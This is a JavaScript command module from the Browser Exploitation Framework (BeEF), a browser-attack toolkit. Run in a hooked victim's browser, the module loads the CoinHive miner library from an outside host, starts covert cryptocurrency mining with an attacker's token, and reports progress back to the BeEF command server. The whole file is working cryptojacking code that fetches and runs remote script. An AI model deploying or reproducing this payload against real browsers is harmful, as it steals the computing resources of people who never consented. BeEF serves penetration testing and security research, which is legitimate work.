//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//
beef.execute(function() {

  load_script = function(url) {
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = url;
    document.body.appendChild(s);
  }

  beef.debug("[CoinHive] Loading library...");
  load_script('https://coinhive.com/lib/coinhive.min.js');
  setTimeout("mine('<%= @public_token %>')", 10000);

  mine = function(token) {
    beef.debug("[CoinHive] Starting the miner...");
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=Starting the miner');

    var miner = new CoinHive.Anonymous(token);
    miner.start(); //CoinHive.FORCE_MULTI_TAB);

    miner.on('authed', function() {
      beef.debug("[CoinHive] Authenticated successfully");
      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=Authenticated successfully', beef.are.status_success());
    })
    miner.on('error', function(params) {
      beef.debug("[CoinHive] The pool reported an error: " + params.error);
      if (params.error === 'invalid_site_key') {
        miner.stop();
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + params.error, beef.are.status_error());
      }
    })
    miner.on('found', function() {
      beef.debug("[CoinHive] Hash found");
    })
    miner.on('accepted', function() {
      beef.debug("[CoinHive] Hash accepted by the pool");
    })

    setInterval(function() {
      if (miner.isRunning()) {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();
        beef.debug("[CoinHive] Total Hashes: " + totalHashes + " -- Accepted Hashes: " + acceptedHashes + " -- Hashes/Second: " + hashesPerSecond);
      }
    }, 1000)
  }
});
